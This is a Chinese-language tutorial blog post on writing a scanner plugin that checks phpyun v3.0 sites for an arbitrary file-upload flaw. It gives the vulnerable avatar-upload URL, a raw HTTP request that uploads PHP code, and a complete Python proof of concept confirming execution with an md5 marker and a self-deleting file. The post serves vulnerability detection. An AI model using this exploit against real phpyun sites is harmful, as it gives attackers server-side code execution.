本篇来分享如何使用hackhttp大法实现文件上传的检测。

文件上传漏洞是上传了一个可执行的脚本文件，并且通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式在渗透测试中最为直接，有效。

为什么会存在文件上传漏洞？

文件上传本身是一个正常的业务需求，因为业务中可能会存在用户头像上传，文档上传，图片上传等等。关键的问题是服

务器怎么对上传的文件进行处理。如果处理的逻辑做的不够安全，则会导致严重的后果。

要利用此漏洞，最基本需要满足两个条件:文件能够被服务器解析以及上传之后文件能够被访问。

代码检测思路

1.上传指定文件到目标中

2.根据路径访问上传后的文件

3.判断是否为1中上传文件的内容

环境测试

这里我选择phpyun v3.0任意文件上传getshell

本地复现

1.注册一个用户，访问member/index.php?XDEBUG_SESSION_START=netbeans-xdebug&M=index&C=save_avatar&type=small&photoId=1.php

post数据为:

<?php phpinfo();?>

2.访问upload/user/user_small/1.php 可看到phpinfo信息。

poc编写

推荐使用SDK中的raw。

优点在于:直接发送 HTTP 原始报文，可直接从 BurpSuite 中复制该报文，使用 hackhttp 的 raw 发包形式来上传文件。

既然是用poc实现文件上传检测。我们肯定要保证文件名的随机化,而不能将文件名固定。这样不方便脚本下一次的检测。下边脚本中使用了random模块实现随机化。

#!/usr/bin/env python
#-*- coding:utf-8 -*-
#phpyun 3.0 文件上传漏洞
import random
def assign(service, arg):
    if service == fingerprint.phpyun:
        return True, arg

def audit(arg):
    filename=random.randint(1,1000)
    payload1="member/index.php?XDEBUG_SESSION_START=netbeans-xdebug&M=index&C=save_avatar&type=small&photoId={}.php".format(filename)
    target1=arg+payload1
    raw="""POST /member/index.php?XDEBUG_SESSION_START=netbeans-xdebug&M=index&C=save_avatar&type=small&photoId={}.php HTTP/1.1
Host: eaab6ba7-fe6c-43f0-b7ad-a7488c0419ad.vulndocker.seclover.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Cookie: xxx
Connection: close
Upgrade-Insecure-Requests: 1

<?php echo md5(1);?>""".format(filename)
    code, head, body, final_url, log = hackhttp.http(target1,raw=raw)
    payload2 = 'upload/user/user_small/{}.php'.format(filename)
    target2=arg+payload2
    code, head, body, final_url, log = hackhttp.http(target2)
    if 'c4ca4238a0b923820dcc509a6f75849b' in body:
        print "File upload succeeded"
if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.phpyun, 'http://xxxx/')[1])

从代码中我们看到文件内容使用样例计算md5()方式进行文件判断。

当然为了更加的准确，我们可以将文件内容再次进行精准。

<?php echo md5(1);unlink(__FILE__);?>

作用就是在我们访问文件一次之后，采用unlink函数自删除。骚不骚。

更多其他语言，如JSP,ASP等的文件上传的样例可参考bugscan插件开发文档(doc.bugscan.net)进行查阅。
